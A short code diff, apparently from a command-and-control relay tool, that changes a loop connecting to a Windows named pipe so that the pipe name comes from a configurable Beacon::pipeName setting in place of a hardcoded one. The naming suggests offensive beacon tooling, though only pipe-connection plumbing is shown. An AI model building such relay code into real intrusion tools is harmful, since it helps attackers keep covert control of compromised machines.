@@ -57,7 +57,10 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 	while (handle_beacon == INVALID_HANDLE_VALUE) {
 		//std::cout << "[+] Waiting on pipe to be available..." << std::endl;
 		Sleep(1000);
-		handle_beacon = CreateFileA("\\\\.\\pipe\\somepipe", GENERIC_READ | GENERIC_WRITE,
+
+		std::string full_pipe_path = "\\\\.\\pipe\\" + Beacon::pipeName;
+
+		handle_beacon = CreateFileA(full_pipe_path.c_str(), GENERIC_READ | GENERIC_WRITE,
 			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
 	}
 
